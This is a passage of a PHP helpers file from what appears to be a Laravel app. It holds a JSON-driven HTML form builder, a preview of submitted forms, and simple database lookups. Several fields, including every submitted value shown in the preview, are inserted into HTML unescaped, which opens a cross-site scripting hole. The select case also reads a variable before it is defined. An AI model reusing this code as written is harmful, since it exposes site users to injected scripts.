                    $frm .= '<div class="col-md-6"><div class="form-group"><label for="'.$f->name.'">'.$f->label.'</label><input type="number" class="'.purify($f->className).'" id="'.purify($f->name).'" name="'.purify($f->name).'" placeholder="'.$placeholder.'" title="'.$description.'" required="'.$required.'" min="'.$min.'" max="'.$max.'" step="'.$step.'" value="'.$value.'"></div></div>';
                    break;
                    
                case 'paragraph':
                    $frm .= '<div class="col-md-12"><'.purify($f->subtype).'>'.purify($f->label).'</'.purify($f->subtype).'></div>';
                    break;
                    
                case 'radio-group':
                    $radio ='';
                    foreach(purify($f->values) as $check){
                        
                        $required = isset($f->required) ? purify(isset($f->required) ? $f->required : false) : false;
                        $selected = isset($check->selected) ? purify(isset($check->selected) ? $check->selected : false) : false;
                        
                        if(purify($f->inline) == true){
                            $radio .= '<div class="form-group"><label for="'.$f->name.'" class="radio-inline"><input type="radio" class="form-check-input" id="'.purify($f->name).'" name="'.purify($f->name).'" required="'.$required.'" checked="'.$selected.'">'.$check->label.'</label></div>';
                            
                            if(purify($f->other) == true){
                                $radio .= '<div class="form-group"><input type="text" class="form-control" id="'.purify($f->name).'" name="'.purify($f->name).'" placeholder="Specify"></div>';
                            }
                            
                        }else{
                            
                            $radio .= '<div class="form-group"><div class="form-check"><label for="'.$f->name.'" class="form-check-label"><input type="radio" class="form-check-input" id="'.purify($f->name).'" name="'.purify($f->name).'" required="'.$required.'" checked="'.$selected.'">'.$check->label.'</label></div></div>';
                            
                            if(purify($f->other) == true){
                                $radio .= '<div class="form-group"><input type="text" class="form-control" id="'.purify($f->name).'" name="'.purify($f->name).'" placeholder="Specify"></div>';
                            }
                            
                        }
                        
                    }
                    $frm .= '<div class="col-md-6">'.$radio.'</div>';
                    break;
                
                case 'select':
                    $options ='';
                    
                    $selected = isset($check->selected) ? purify(isset($check->selected) ? $check->selected : false) : false;
                    $multiple = isset($f->multiple) ? purify(isset($f->multiple) ? $f->multiple : false) : false;
                    $multiple = !empty($multiple) ? 'multiple':'';
                    $required = isset($f->required) ? purify(isset($f->required) ? $f->required : false) : false;
                    
                    foreach(purify($f->values) as $check){
                        
                        $options .= '<option value="'.$check->value.'">'.$check->label.'</option>';
                    }
                    $frm .= '<div class="col-md-6"><div class="form-group"><label for="'.$f->name.'">'.$f->label.'</label><select class="form-control" id="'.purify($f->name).'" name="'.purify($f->name).'" required="'.$required.'">'.$options.'</select></div></div>';
                    
                    break;
                
                case 'text':
                    $placeholder = isset($f->placeholder) ? purify(isset($f->placeholder) ? $f->placeholder : $f->label) : $f->label;
                    
                    $description = isset($f->description) ? purify(isset($f->description) ? $f->description : $f->label) : $f->label;
                    
                    $required = isset($f->required) ? purify(isset($f->required) ? $f->required : false) : false;
                    
                    $req = isset($f->required) ? purify(isset($f->required) ? $f->required : false) : false;
                    $req = !empty($req) ? '<span style="color:red">*</span>':'';
                    
                    $maxlen = isset($f->maxlength) ? purify(isset($f->maxlength) ? $f->maxlength : false) : false;
                    
                    $maxlen = !empty($maxlen) ? 'maxlength='.$maxlen:'';
                    
                    $value = isset($f->value) ? purify(isset($f->value) ? $f->value : false) : false;
                    
                    $frm .= '<div class="col-md-6"><div class="form-group"><label for="'.$f->name.'">'.$f->label.' '.$req.'</label><input type="'.$f->subtype.'" class="'.purify($f->className).'" id="'.purify($f->name).'" name="'.purify($f->name).'" placeholder="'.$placeholder.'" title="'.$description.'" required="'.$required.'" '.$maxlen.' value="'.$value.'"></div></div>';
                    break;
                    
                case 'textarea':
                    $placeholder = isset($f->placeholder) ? purify(isset($f->placeholder) ? $f->placeholder : $f->label) : $f->label;
                    
                    $description = isset($f->description) ? purify(isset($f->description) ? $f->description : $f->label) : $f->label;
                    
                    $required = isset($f->required) ? purify(isset($f->required) ? $f->required : false) : false;
                    
                    $req = isset($f->required) ? purify(isset($f->required) ? $f->required : false) : false;
                    $req = !empty($req) ? '<span style="color:red">*</span>':'';
                    
                    $maxlen = isset($f->maxlength) ? purify(isset($f->maxlength) ? $f->maxlength : false) : false;
                    
                    $maxlen = !empty($maxlen) ? 'maxlength='.$maxlen:'';
                    
                    $value = isset($f->value) ? purify(isset($f->value) ? $f->value : false) : false;
                    
                    $frm .= '<div class="col-md-6"><div class="form-group"><label for="'.$f->name.'">'.$f->label.' '.$req.'</label><textarea type="'.$f->subtype.'" class="'.purify($f->className).'" id="'.purify($f->name).'" name="'.purify($f->name).'" placeholder="'.$placeholder.'" title="'.$description.'" required="'.$required.'" '.$maxlen.'>'.$value.'</textarea></div></div>';
                    break;
            }
        }
        return '<div class="row">'.$frm.'</div>';
    }
}

if (! function_exists('preview_ebForm')) {

    function preview_ebForm($order, $form){
        $data = json_decode($order->completed_form);
        if($data) {
            $frm = '';
            $frm .= '<tr>
                        <td>
                           <h6 style="text-transform:capitalize">FORM ID :</h6>
                        </td>
                        <td>
                            <h6>'.$order->form_id.'</h6>
                        </td>
                    </tr>
                    <tr>
                        <td>
                           <h6 style="text-transform:capitalize">ORDER ID :</h6>
                        </td>
                        <td>
                            <h6>'.$order->txn_code.'</h6>
                        </td>
                    </tr>
                    <tr>
                        <td>
                           <h6 style="text-transform:capitalize">REGISTRAR :</h6>
                        </td>
                        <td>
                            <h6>'.$form->registrar->user->email.'</h6>
                        </td>
                    </tr><tr><td></td><td></td></tr>';
                    
            foreach($data as $name => $value)
            {
                        
                $frm .= '<tr>
                            <td>
                               <h5 style="text-transform:capitalize">'.str_replace("_", " ", $name).' : </h5>
                            </td>
                            <td>
                                <h5>'.$value.'</h5>
                            </td>
                        </tr>';
            }
        }else{
            $frm = '<div class="col-md-12"><h2 class="text-danger">Oops! Preview is not available for this form.</h2></div>';
        }
        
        return '<table class="table table-striped" style="font-size:12px"><tbody>'.$frm.'</tbody></table><br><button class="btn bg-sec" id="ebeanoFormPrint" onclick="ebeanoFormPrint()">Print Form</button><br>';
    }
}


function get_form($form_id)
{
    return InstituteForms::where(['reference'=>$form_id])->first();
}

function get_institute($id)
{
    return InstituteList::where(['id'=>$id])->first();
}


/* Block of code for Artisan */
function get_artisan_category($id) {
    $res = DB::table("artisan_categories")->where("id" , $id)->first();
    if (!$res)
        return false;
    return $res;
}

function get_artisan_user($id) {
    $res = DB::table("users")->where("id" , $id)->first();
    if (!$res)
        return false;
    return $res;
}


/* Block of code for Real Estate */
function get_estate_category($id) {
    $res = DB::table("estate_category")->where("id" , $id)->first();
    if (!$res)
        return false;
    return $res->name;
}

function get_estate_testimonials() {
    $res = DB::table("estate_testimonials")->get();
    if (!$res)
        return false;
    return $res;
}

function get_estate_property($id) {
    $res = DB::table("estate_properties")->where("id" , $id)->first();
    if (!$res)
        return false;
    return $res;
}

function all_estate_property($type) {
    $res = DB::table("estate_properties")->where("type" , $type)->get();
    if (!$res)
        return false;
    return $res;
}

function all_estate_category() {
    $res = DB::table("estate_category")->where("is_delete" , 0)->get();
    if (!$res)
        return false;
    return $res;
}

function time_elapsed_string($datetime, $full = false) {
    $now = new DateTime;
    $ago = new DateTime($datetime);
    $diff = $now->diff($ago);

    $diff->w = floor($diff->d / 7);
    $diff->d -= $diff->w * 7;

    $string = array(
        'y' => 'year',
        'm' => 'month',
        'w' => 'week',
        'd' => 'day',
        'h' => 'hour',
        'i' => 'minute',
        's' => 'second',
    );
    foreach ($string as $k => &$v) {
        if ($diff->$k) {
            $v = $diff->$k . ' ' . $v . ($diff->$k > 1 ? 's' : '');
        } else {
            unset($string[$k]);
        }
    }

    if (!$full)
        $string = array_slice($string, 0, 1);
    return $string ? implode(', ', $string) . ' ago' : 'just now';
}






?>
